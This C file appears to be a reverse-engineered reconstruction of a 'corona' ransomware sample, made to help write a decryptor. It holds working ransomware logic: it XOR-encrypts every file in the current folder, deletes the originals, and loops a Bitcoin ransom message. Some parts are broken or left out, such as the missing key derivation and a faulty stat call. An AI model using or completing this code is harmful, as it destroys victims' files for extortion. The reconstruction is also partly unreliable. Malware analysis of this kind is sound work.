#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <dirent.h>
#include <stdio.h>
#include <sys/stat.h>


void stat_wrapper(char *filename, struct stat *stat_struct){
    stat(filename, &stat_struct);
}

int xstat_wrapper_func(char *filename){
    char *var_a8 = filename;
    struct stat var_a0;
    stat_wrapper(var_a8, &var_a0);
    /* disassembly had reference to "xstat"  */
    /* which is completely unknown to me     */
    /* and i couldn't find a straight answer */

    /* from what i could infer from the disassembly   */
    /* this code was meant to return a value from the */
    /* stat structure (or xstat struct?)              */
    
    /* Either way, that isn't vital to understanding     */
    /* the bigger picture or developing a decrypt script */
    return 1;
}

/* pretty self explanatory function, just generates     */
/* a new name for the file after its contents have been */
/* encrypted */
void new_filename(char *filename, char *new_fn){
    char *s2 = filename; /* [rbp-0x10] */
    char *s1 = new_fn;   /* [rbp-0x08] */
    int x;

    strcpy(new_fn, "./\0");
    strcat(new_fn, filename);

    for(x = 0; new_fn[x]; x++);
    strcpy((new_fn+x), ".corona");

    return;
}

void main(int argc, char **argv){
    int var_b4 = argc;      /* [rbp-0xb4] */
    char **var_s = argv;    /* [rbp-0xc0] */
    char new_fn[56] = 0x20; /* [rbp-0x80] */
    uint32_t xor_byte = 0;  /* [rbp-0xa4] */
    char bin_name[56];      /* [rbp-0x40] */
    DIR *cur_dir;           /* [rbp-0xa0] */
    struct dirent *de;      /* [rbp-0x98] */
    FILE *read_fp;          /* [rbp-0x90] */
    FILE *write_fp;         /* [rbp-0x88] */
    uint64_t c;             /* [rbp-0xa5] */

    srand(0xdeadbeef);
    /* call to rand() with some arithmetics.              */
    /* refer to srand.asm for instructions: 0xd07 - 0xd4d */
    /* resulting integer is stored in var_a4              */

    strncpy(bin_name, (argv[0]+2), strlen(argv[0]));

    cur_dir = opendir(".");
    if(cur_dir != NULL){
        while((de = readdir(cur_dir)) != NULL){
            if(strcmp(bin_name, de->d_name) != 0){
                if(xstat_wrapper_func(de->d_name) != 0){
    
                    read_fp = fopen(de->d_name, "rb");
                    new_filename(de->d_name, new_fn);
                    write_fp = fopen(new_fn, "w");
    
                    while(!feof(read_fp)){
                        c = getc(read_fp);
                        if(feof(read_fp)) continue;
                        c ^= (uint8_t)xor_byte;
                        fputc(c, write_fp);
                    }
    
                    fclose(read_fp);
                    remove(de->d_name);
                    fclose(write_fp);
                }
            }
            *new_fn = '\0';
        }
        closedir(cur_dir);
    }
    for(;;){
        puts("\e[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAH                                                             AHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAH      SO YOU THOUGHT COVID-19 IS ONLY A HUMAN'S VIRUS?       AHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAH     NOW TRANSFER 0.2 BTC TO THE FOLLOWING BITCOIN ADDRESS   AHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAH                 TO GET YOUR FILES BACK                      AHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAH         BTC : 1PC9aZC4hNX2rmmrt7uHTfYAS3hRbph4UN            AHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAH                                                             AHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHAHHA \e[0m");
        puts("\e[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHAHHA \e[0m");
        sleep(1);
        system("clear");
    }
}